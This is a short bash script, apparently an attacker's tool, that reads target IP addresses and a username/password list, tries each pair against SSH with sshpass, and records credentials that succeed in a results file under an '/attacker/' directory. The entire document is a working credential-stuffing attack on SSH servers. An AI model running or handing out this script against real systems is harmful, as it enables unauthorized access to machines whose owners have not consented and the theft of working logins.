
#!/bin/bash

# Full path to the CSV file
csv_file="/attacker/user-pass.csv"

# Output CSV file with login results
output_file="/attacker/login_results.csv"

# Outputed IP addresses CSV
IPs="/attacker/output.csv"

# Add CSV header
echo "IP Address,Username,Password,Login Status" > "$output_file"

# Read the CSV file containing login credentials
login_successful=false

# Use tail to skip the first line (header) in the IPs CSV file
tail -n +2 "$IPs" | while IFS=',' read -r ip _; do  # Only read the first field (IP address)
    while IFS=',' read -r username password; do
        echo "$username,$password" >> "$output_file"
        # Use a tool like sshpass to attempt the login
        if sshpass -p "$password" ssh "$username@$ip" exit; then
            login_status="Success"
            login_successful=true
            # Append the login results to the output CSV file
            echo "$ip,$username,$password,$login_status" >> "$output_file"
            break 2  # Exit both while loops when a successful login is found
        #else
            #login_status="Failed"
            #echo "$ip,$username,$password,$login_status" >> "$output_file"
        fi
    done < "$csv_file"

    if [ "$login_successful" = true ]; then
        break  # Exit the outer while loop if a successful login is found
    fi
done
